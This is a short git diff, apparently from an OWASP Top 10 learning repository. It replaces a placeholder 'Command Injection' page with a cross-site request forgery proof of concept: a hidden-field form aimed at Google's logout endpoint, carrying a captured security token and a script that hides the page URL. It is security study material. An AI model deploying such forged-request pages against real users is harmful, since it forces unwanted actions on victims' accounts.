@@ -1,9 +1,13 @@
-<!DOCTYPE html>
 <html>
-	<title>OWSAP TOP 10 </title>
-	<body>
-		<h1>Command Injection </h1>
-		<?php echo " hello world " ?>
-	</body>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://accounts.google.com/Logout">
+      <input type="hidden" name="hl" value="en" />
+      <input type="hidden" name="continue" value="https&#58;&#47;&#47;www&#46;google&#46;com&#47;&#63;authuser&#61;1" />
+      <input type="hidden" name="timeStmp" value="1610955075" />
+      <input type="hidden" name="secTok" value="&#46;AG5fkS9vBjg7lOEul86pj3RXcZMfu1no6g" />
+      <input type="hidden" name="ec" value="GAdAAQ" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
 </html>
-
